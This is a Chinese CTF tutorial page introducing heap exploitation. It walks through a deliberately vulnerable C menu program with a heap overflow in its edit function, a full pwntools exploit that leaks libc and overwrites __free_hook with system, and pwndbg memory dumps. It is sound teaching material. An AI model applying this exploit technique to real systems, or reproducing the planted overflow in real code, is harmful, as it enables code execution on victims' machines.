---
title: 关于“堆”题的总体思路
url: https://www.secpulse.com/archives/198072.html
source: 安全脉搏
date: 2023-03-23
fetch_date: 2025-10-04T10:20:25.189141
---

# 关于“堆”题的总体思路

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 关于“堆”题的总体思路

[CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-03-22

15,380

#### 浅说一下pwn堆并用一个简单的例子具体说明

给刚入坑堆的小朋友说的一些思路

### 说一下堆是什么

堆你可以看成一个结构体数组，然后数组里每个元素都会开辟一块内存来存储数据

那么这块用来存储数据的内存就是堆。

结构体数组在BSS段上，其内容就是堆的地址，也就是堆的指针。

### 说一下堆的理解

堆有很多题型 什么堆溢出，off by null , uaf 等。

核心的话主要是学思想，所有人都知道我要得到shell，cat flag。但是要怎么去干得有个过程，

比如我们做栈题，很容易知道我要劫持栈的返回去执行任意地址，填入shellcode什么的。

堆的话也是一样。

就是用`system`去执行`/bin/sh`。越复杂的问题往往只需要很简单的道理。

所以堆到底要怎么去执行。

我们可以把某一个函数的内容改成system，下次调用该函数即是使用system，

再在别的堆里面放入`/bin/sh`字符串，然后再用刚刚修改的函数，使用已经放入字符串的堆。

即可执行`system(/bin/sh)`了

一般修改`__free_hook`，使其内容变成`system`然后再free掉放有`/bin/sh`的堆

### 举例说明

我用一个很简单的例子去一步一步简单剖析。

这里我用一个很简单的例子去一步一步简单剖析。

先给出源码和gcc编译，使用的是Ubuntu18

```
gcc -o lizi lizi.c
```

```
#include<stdio.h>
#include<stdlib.h>
char *heap[0x20];
int num=0;
void create()
{
    if(num>=0x20)
    {
        puts("no more");
        return;
    }
    int size;
    puts("how big");
    scanf("%d",&size);
    heap[num]=(char *)malloc(size);
    num++;
}
void show(){
  int idx;
  char buf[4];
  puts("idx");
    (read(0, buf, 4));
    idx = atoi(buf);
  if (!heap[idx]) {
    puts("no have thingsn");
  } else {
    printf("Content:");
    printf("%s",heap[idx]);
  }
}
void dele()
{
  int idx;
  char buf[4];
  puts("idx");
    (read(0, buf, 4));
    idx = atoi(buf);
  if (!heap[idx]) {
    puts("no have thingsn");
  } else {
      free(heap[idx]);
      heap[idx]=NULL;
      num--;
  }
}
void edit()
{
  int size;
  int idx;
  char buf[4];
  puts("idx");
    (read(0, buf, 4));
    idx = atoi(buf);
  if (!heap[idx]) {
    puts("no have thingsn");
  } else {
      puts("how big u read");
      scanf("%d",&size);
      puts("Content:");
      read(0,heap[idx],size);
  }
}
void menu(void){
    puts("1.create");
    puts("2.dele");
    puts("3.edit");
    puts("4.show");
}
void main()
{
    int choice;
    while(1)
    {
        menu();
        scanf("%d",&choice);
        switch(choice)
        {
            case 1:create();break;
            case 2:dele();break;
            case 3:edit();break;
            case 4:show();break;
            default:puts("error");
        }
    }
}
```

我们也不用ida了，直接源码分析，很明显在edit处能知道我们可以修改堆大小，

而导致的堆溢出修改下一个堆。

我们可以直接使用unsortedbin，申请较大的堆，再free掉，再申请个小堆，

使其从unsortedbin里面切割堆，这样，你申请的小堆就会有一些unsortedbin里面的东西。

（具体请看unsortedbin介绍）

结合exp介绍：

```
from pwn import *
r=process('./lizi')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level='debug'
def add(size):
    r.sendlineafter("4.shown",'1')
    r.sendlineafter("idxn",str(size))

def dele(idx):
    r.sendlineafter("4.shown",'2')
    r.sendlineafter("idxn",str(idx))

def edit(idx,size,con):
    r.sendlineafter("4.shown",'3')
    r.sendlineafter("idxn",str(idx))
    r.sendlineafter("how big u readn",str(size))
    r.sendafter("Content:n",con)
def show(idx):
    r.sendlineafter("4.shown",'4')
    r.sendlineafter("idxn",str(idx))

add(0x420)
add(0x420)
add(0x420)
dele(1)

add(0x70)
show(2)

r.recvuntil("Content:")
base=u64(r.recv(6)+'x00'*2)-0x3ec090
print(hex(base))
free=base+libc.sym['__free_hook']
sys=base+libc.sym['system']

add(0x70)
dele(3)

edit(2,0x100,'a'*0x70+p64(0xa0)+p64(0xa1)+p64(free))

add(0x70)
add(0x70)
edit(3,0x10,"/bin/shx00")
edit(4,0x10,p64(sys))
dele(3)

r.interactive()
```

首先菜单不用多说，很简单的交互，写好就行

然后申请3个堆，为了保证能进入unsortedbin，得大于tcache的大小，然后free掉1号堆

```
unsortedbin
all: 0x55ce36aa7aa0 —▸ 0x7f4f9036aca0 (main_arena+96) ◂— 0x55ce36aa7aa0
```

可以看到1号堆已经进入到unsortedbin了

然后申请一个小堆

```
pwndbg> x/32gx 0x55697b2cfaa0
0x55697b2cfaa0: 0x0000000000000000 0x0000000000000081
0x55697b2cfab0: 0x00007fb8eada6090 0x00007fb8eada6090
0x55697b2cfac0: 0x000055697b2cfaa0 0x000055697b2cfaa0
0x55697b2cfad0: 0x0000000000000000 0x0000000000000000
0x55697b2cfae0: 0x0000000000000000 0x0000000000000000
0x55697b2cfaf0: 0x0000000000000000 0x0000000000000000
0x55697b2cfb00: 0x0000000000000000 0x0000000000000000
0x55697b2cfb10: 0x0000000000000000 0x0000000000000000
0x55697b2cfb20: 0x0000000000000000 0x00000000000003b1
0x55697b2cfb30: 0x00007fb8eada5ca0 0x00007fb8eada5ca0
0x55697b2cfb40: 0x0000000000000000 0x0000000000000000
0x55697b2cfb50: 0x0000000000000000 0x0000000000000000
0x55697b2cfb60: 0x0000000000000000 0x0000000000000000
0x55697b2cfb70: 0x0000000000000000 0x0000000000000000
0x55697b2cfb80: 0x0000000000000000 0x0000000000000000
0x55697b2cfb90: 0x0000000000000000 0x0000000000000000
```

查看申请堆的地址可以发现，11行处是已经之前free掉的1号堆，这个申请的堆会在unsortedbin里面切割

然后会有残留地址，然后我们把他show出来就可以计算一波libc地址了。

算出`system`,`__free_hook`的libc，

接着为什么要多申请一个堆，这里就是堆溢出的打法了，

在刚刚申请的堆后面再建一个堆，然后通过free掉修改内容指向`__free_hook`地址

再把内容改成`system`就可以把free当做system用了；

在`edit(2,0x100,'a'*0x70+p64(0xa0)+p64(0xa1)+p64(free))后面打个断点`

GDB看看

```
pwndbg> bin
tcachebins
0x80 [  1]: 0x55f37c653b30 —▸ 0x7f4497d688e8 (__free_hook) ◂— ...
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x55f37c653ba0 —▸ 0x7f4497d66ca0 (main_arena+96) ◂— 0x55f37c653ba0
smallbins
empty
largebins
empty
```

会发现tcache里面已经有`__free_hook`了，因为已经把内容改成`__free_hook`的地址了。

然后申请2个堆，把tcache里面的`__free_hook`拿出来。

你也可以验证一下、

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x55f37bb59000     0x55f37bb5a000 r-xp     1000 0
```

```
pwndbg> x/32gx 0x5597ecced000+0x202040
0x5597eceef040 <heap>: 0x00005597ee8ef680 0x0000000000000000
0x5597eceef050 <heap+16>: 0x00005597ee8efab0 0x00005597ee8efb30
0x5597eceef060 <heap+32>: 0x00007f7694f2e8e8 0x0000000000000000
0x5597eceef070 <heap+48>: 0x0000000000000000 0x0000000000000000
```

`0x202040`是heap的偏移，可以从ida里面找到。

申请出来的堆，`__free_hook`在4号堆

```
pwndbg> x/32gx 0x00007f7694f2e8e8
0x7f7694f2e8e8 <__free_hook>: 0x0000000000000000 0x0000000000000000...